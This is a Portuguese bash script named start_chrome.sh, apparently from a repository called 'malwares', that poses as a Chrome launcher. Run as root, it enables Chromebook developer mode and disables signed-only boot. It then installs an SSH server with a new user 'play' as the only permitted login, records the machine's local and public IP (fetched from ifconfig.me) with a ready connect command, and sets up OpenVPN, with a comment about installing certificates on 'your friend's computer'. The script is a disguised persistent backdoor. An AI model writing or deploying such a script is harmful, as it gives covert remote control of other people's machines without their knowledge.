#!/bin/bash

# Antes de iniciar este comando: chmod +x start_chrome.sh
# Função para exibir uma mensagem de erro e sair do script
exit_with_error() {
    echo "Erro: $1"
    exit 1
}

# Verifica se o script está sendo executado como root
if [[ $EUID -ne 0 ]]; then
    exit_with_error "Este script deve ser executado como root."
fi

# Instalação do Python e dependências
sudo apt update
sudo apt install -y git
sudo apt install -y python3 python3-pip python3-venv git

# Configurações
username=$(whoami)
app_name="System App"
desktop_file="/home/$username/.config/autostart/$app_name.desktop"
install_directory="/chrome"
output_file="ssh_info.txt"
python_executable="python3"
repository_url="https://github.com/efraim-lima/malwares"
relative_path="./modules/play.py"
ssh_port="22" # Porta SSH (padrão é 22)
ssh_dir="/home/$username/.ssh"
ssh_key="$ssh_dir/id_rsa"
usernameb="play"
venv_name="chrome"
venv_dir="./chrome"
ip_publico=$(curl -s ifconfig.me)

# Função para habilitar o modo de desenvolvedor no Chromebook
habilitar_modo_desenvolvedor() {
  if [ ! -f "./tmp/mode_dev_enabled.txt" ]; then
    echo "Habilitando o modo de desenvolvedor..."
    
    # Tenta executar o comando para habilitar o modo de desenvolvedor
    if sudo chromeos-firmwareupdate --mode=todev; then
      # Se o comando for executado com sucesso, continue com os próximos comandos
      sudo crossystem dev_boot_usb=1 dev_boot_signed_only=0
      sudo chromeos-setdevpasswd
    else
      echo "O comando para habilitar o modo de desenvolvedor não foi aceito."
      echo "Por favor, siga o procedimento abaixo para habilitar o modo de desenvolvedor manualmente:"
      echo
      echo "1. Desligue o Chromebook."
      echo "2. Pressione e segure as teclas Esc + Refresh (normalmente é a quarta tecla na fileira superior com uma seta circular) no teclado."
      echo "3. Enquanto mantém essas teclas pressionadas, pressione o botão de ligar para ligar o Chromebook."
      echo "4. Solte as teclas quando você ver a tela de recuperação."
      echo "5. A partir daqui, use as teclas de seta para navegar até as opções avançadas e pressione Enter."
      echo "6. Na próxima tela, selecione 'Enable Developer Mode' e pressione Enter."
      echo "7. Na última tela, pressione 'Confirm'."
      echo
      read -n 1 -s -r -p "Pressione qualquer tecla quando terminar o procedimento de habilitação do modo de desenvolvedor..."
      echo
    fi

    sudo touch "./tmp/mode_dev_enabled.txt"
    sudo shutdown now
    exit 0
  fi
}

ssh_metodo_inicial(){
  if [ ! -f "./tmp/ssh_enabled.txt" ]; then
    sudo apt install -y openssh-server

    # Criação de um novo usuário do primeiro script
    useradd -m -s /bin/bash $usernameb
    passwd $usernameb

    # Define as permissões corretas para a chave do primeiro script
    chown -R $username:$username $ssh_dir
    chmod 700 $ssh_dir
    chmod 600 $ssh_key*

    # Configuração do acesso remoto via SSH do primeiro script
    sed -i "s/#Port 22/Port $ssh_port/" /etc/ssh/sshd_config
    sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin no/' /etc/ssh/sshd_config
    sed -i 's/#PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config
    echo "AllowUsers $usernameb" >> /etc/ssh/sshd_config

    # Reinicia o serviço SSH do primeiro script
    systemctl restart ssh

    # Exporta informações para o arquivo de saída do primeiro script
    output_path="/home/$username/$output_file"
    echo "Chave SSH: $ssh_key" > $output_path
    echo "Nome de usuário: $usernameb" >> $output_path
    echo "IP da máquina: $(hostname -I)" >> $output_path
    echo "IP publico: $(curl -s ifconfig.me)" >> $output_path
    echo "ssh -p $ssh_port $usernameb@$(hostname -I)" >> $output_path

    echo "Chave SSH criada com sucesso. As informações foram exportadas para o arquivo $output_file."
    echo "Agora você pode acessar sua máquina remotamente via terminal usando:"
    echo "ssh -p $ssh_port $usernameb@$(hostname -I)"

    # Criação da chave SSH do primeiro script
    mkdir -p $ssh_dir
    ssh-keygen -t rsa -b 4096 -f $ssh_key -N ""
    
    sudo touch "./tmp/ssh_enabled.txt"
  fi
}

vpn_metodo_inicial() {
  if [ ! -f "./tmp/vpn_enabled.txt" ]; then

    echo "-e Este é o IP público DESTA MÁQUINA -e $ip_publico"

    sudo apt install -y openvpn
    sudo apt update && apt -y install ca-certificates wget net-tools gnupg
    wget https://as-repository.openvpn.net/as-repo-public.asc -qO /etc/apt/trusted.gpg.d/as-repository.asc
    echo "deb [arch=amd64 signed-by=/etc/apt/trusted.gpg.d/as-repository.asc] http://as-repository.openvpn.net/as/debian jammy main">/etc/apt/sources.list.d/openvpn-as-repo.list
    sudo apt update && apt -y install openvpn-as

    # Configuração do OpenVPN
    SEU_IP_PUBLICO=$ip_publico
    PORTA_OPENVPN="1194"
    PROTOCOLO_OPENVPN="udp"

    # Criação do arquivo de configuração do cliente
    cat > ./openvpn_client.conf <<EOL
client
dev tun
remote $SEU_IP_PUBLICO $PORTA_OPENVPN
resolv-retry infinite
nobind
persist-key
persist-tun
comp-lzo
verb 3
ca /etc/openvpn/ca.crt
cert /etc/openvpn/client.crt
key /etc/openvpn/client.key
data-ciphers AES-256-GCM:AES-128-GCM:CHACHA20-POLY1305
EOL

    # Criação do diretório de certificados
    sudo mkdir -p /etc/openvpn

    # Salvar os certificados no computador do seu amigo
    echo "$CA_CERT" | sudo tee /etc/openvpn/ca.crt
    echo "$CLIENT_CERT" | sudo tee /etc/openvpn/client.crt
    echo "$CLIENT_KEY" | sudo tee /etc/openvpn/client.key

    sudo touch "./tmp/vpn_enabled.txt"
  fi
}


vpn_metodo_secundario(){
  sudo apt update && apt -y install ca-certificates wget net-tools gnupg
  wget https://as-repository.openvpn.net/as-repo-public.asc -qO /etc/apt/trusted.gpg.d/as-repository.asc
  echo "deb [arch=amd64 signed-by=/etc/apt/trusted.gpg.d/as-repository.asc] http://as-repository.openvpn.net/as/debian bullseye main">/etc/apt/sources.list.d/openvpn-as-repo.list
  sudo apt update && apt -y install openvpn-as
}

# Lógica try-catch para executar as funcionalidades em ordem
executar_funcionalidades() {
  #função
  habilitar_modo_desenvolvedor || echo "erro ao habilitar modo desenvolvedor"

  ssh_metodo_inicial || echo "SSH inicial não funcionou"

  sudo openvpn --config ./openvpn_client.conf && vpn_metodo_inicial || echo "VPN inicial não funcionou"

}

executar_funcionalidades